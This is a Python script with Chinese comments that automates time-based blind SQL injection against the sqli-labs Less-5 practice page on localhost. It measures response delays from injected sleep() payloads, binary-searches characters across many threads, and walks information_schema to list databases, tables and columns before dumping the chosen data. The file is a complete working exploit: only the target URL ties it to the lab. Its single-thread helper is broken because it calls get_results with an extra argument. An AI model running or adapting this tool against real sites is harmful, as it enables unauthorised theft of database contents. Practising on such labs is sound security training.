# coding=utf-8


import datetime
import requests
import threading

url = 'http://127.0.0.1/sqli-labs/Less-5/?id='   # todo test
value_default = '1'

# 前构造点
start = ['\'', '\')', '\"', '\")']

# 后构造点
end = ['%23', '--+', '#', "or '1'='1"]

start_default = start[0]
end_default = end[0]
thread_num_default = 30

# 测试连接时间基准
print('测试网络连接中...')

test_time_start = datetime.datetime.now()
for i in range(5):
    requests.get(url)
test_time_end = datetime.datetime.now()
t = test_time_end.timestamp() - test_time_start.timestamp()

direct_time = t / 5  # 直接连接时间
net_wave = direct_time * 10  # 网络波动时间
time_default = direct_time * 20  # 默认设置的sleep时间
print('平均连接时间为：', direct_time,'秒')
print('设置的网络波动为：', net_wave,'秒')
print('设置的sleep时间为：', time_default,'秒')


# 载荷
def set_payload(what, order, compare, ascii_value, time=time_default, payload_type=1):
    if payload_type == 1:
        return '  and if(ascii(substr(' + what \
               + ',' + str(order) \
               + ',1))' + compare + str(ascii_value) \
               + ',sleep(' + str(time) + '),1)'
    elif payload_type == 2:
        return ' and if(length(' + what + ')' + compare + str(ascii_value) + ',sleep(' + str(time) + '),1)'
    else:
        pass


# 拼接url
def set_url(url, payload, start=start_default, end=end_default, value=value_default):
    return url + value + start + payload + end


# 判断是否猜对
def is_true(url):
    first = datetime.datetime.now()
    requests.get(url)
    last = datetime.datetime.now()
    if last.timestamp() - first.timestamp() > direct_time + net_wave:
        return True
    else:
        return False


# 显示进度
def graph_percent(percent):
    num = int(percent * 80)
    str_output = '['
    for i in range(num):
        str_output += '='
    for i in range(80 - num - 1):
        str_output += ' '
    str_output += ']'
    print('\033[0;36m', '\r%s%s%%' % (str_output, str(percent * 100)), '\033[0m', end='')


# 二分法判断
def get_length(url, what):
    print("计算", what, '结果的长度 ...')
    min = 0
    max = 10000
    middle = 0
    while middle == 0 and max < 10e8:
        middle = (max + min) // 2
        payload = set_payload(what, None, '>', middle, payload_type=2)
        final_url = set_url(url, payload)
        while middle != min and middle != max and not is_true(
                set_url(url, set_payload(what, None, '=', middle, payload_type=2))):
            if is_true(final_url):
                min = middle
            else:
                max = middle
            middle = (max + min) // 2
            payload = set_payload(what, None, '>', middle, payload_type=2)
            final_url = set_url(url, payload)
            # print(final_url, min, middle, max)
        if is_true(set_url(url, set_payload(what, None, '=', middle, payload_type=2))):
            print(what, '结果的长度为', '\033[0;32m', middle, '\033[0m')
            return middle
        elif middle != 0:
            middle = 0
            max *= 10
        elif middle == 0:
            print("输入错误")
            return 0


# 二分法获得第i个字符
def get_results(url, what, i, result):
    # print("计算", what, '的第', i, '个结果 ...')
    # global length
    # result = ''
    # while i < length + 1:
    min = 32
    max = 127
    middle = (max + min) // 2
    payload = set_payload(what, i, '>', middle)
    final_url = set_url(url, payload)
    while middle != min and middle != max and not is_true(set_url(url, set_payload(what, i, '=', middle))):
        if is_true(final_url):
            min = middle
        else:
            max = middle
        middle = (max + min) // 2
        payload = set_payload(what, i, '>', middle)
        final_url = set_url(url, payload)
        # print(final_url, chr(middle))
    if is_true(set_url(url, set_payload(what, i, '=', middle))):
        result[i - 1] = chr(middle)
    else:
        result[i - 1] = ' '
    # i += 1
    # print(what, '第', i, '个结果为：', result)
    # return result


# 单线程
def single_thread(url, what):
    length = get_length(url, what)
    results = ['' for i in range(length)]
    t = []
    sleep_time = 2
    for i in range(length):
        t.append(threading.Thread(target=get_results, args=(url, what, i + 1, results, sleep_time)))
        t[i].start()
        t[i].join()
    results.append(',')
    str_result = ''
    final_result = []
    for i in results:
        if i != ',':
            str_result += i
        else:
            final_result.append(str_result)
            str_result = ''
    print(what, '的最终结果为：', final_result)
    return final_result


# 开启多线程
def multi_thread(url, what, thread_num=thread_num_default):
    length = get_length(url, what)
    if length == 0:
        return
    results = ['' for i in range(length)]
    t = []
    if length < thread_num:
        for i in range(length):
            t.append(threading.Thread(target=get_results, args=(url, what, i + 1, results)))
            t[i].start()
        for i in range(length):
            t[i].join()
            graph_percent((i + 1) / length)
    else:
        tasks_end = 0
        while length != tasks_end:
            tasks_start = tasks_end
            if tasks_start + thread_num < length:
                tasks_end += thread_num
            else:
                tasks_end = length
            for i in range(tasks_start, tasks_end):
                t.append(threading.Thread(target=get_results, args=(url, what, i + 1, results)))
                t[i].start()
            for i in range(tasks_start, tasks_end):
                t[i].join()
                graph_percent((i + 1) / length)
    results.append(',')
    str_result = ''
    final_result = []
    for i in results:
        if i != ',':
            str_result += i
        else:
            final_result.append(str_result)
            str_result = ''
    print('\n', what, '的最终结果为：', '\033[0;32m', final_result, '\033[0m')
    return final_result


# payload = set_payload('version()', 1, '=', 15)
# url_final = set_url(url, payload)
# if is_true(url_final):
#     print('yes')
# else:
#     print('no')
if __name__ == '__main__':
    totaltime_start = datetime.datetime.now()
    print('start time: ', totaltime_start.strftime('%Y-%m-%d %I:%M:%S'))
    # step1 = 'database()'
    # result1 = single_thread(url, step1)[0]

    # step = 'database()'
    # result = multi_thread(url, step)[0]

    step1 = '(SELECT group_concat(schema_name) FROM information_schema.schemata)'
    result1 = multi_thread(url, step1)
    database = input('database:')
    while database not in result1:
        print("输入错误，请重新输入")
        database = input('database:')

    step2 = '(select group_concat(table_name) from information_schema.tables where table_schema=\'' + database + '\')'
    result2=multi_thread(url, step2)
    tablename = input('tablename:')
    while tablename not in result2:
        print("输入错误，请重新输入")
        tablename = input('tablename:')

    step3 = '(select group_concat(column_name) from information_schema.columns where table_name=\'' + tablename + '\')'
    result3=multi_thread(url, step3)
    what = input('what:')
    while what not in result3:
        print("输入错误，请重新输入")
        what = input('what:')

    step4 = '(select group_concat(' + what + ') from ' + tablename + ')'
    result4 = multi_thread(url, step4)

    totaltime_stop = datetime.datetime.now()
    print('end time: ', totaltime_stop.strftime('%Y-%m-%d %I:%M:%S'))
    print('总耗时：', (totaltime_stop - totaltime_start).seconds, 'seconds')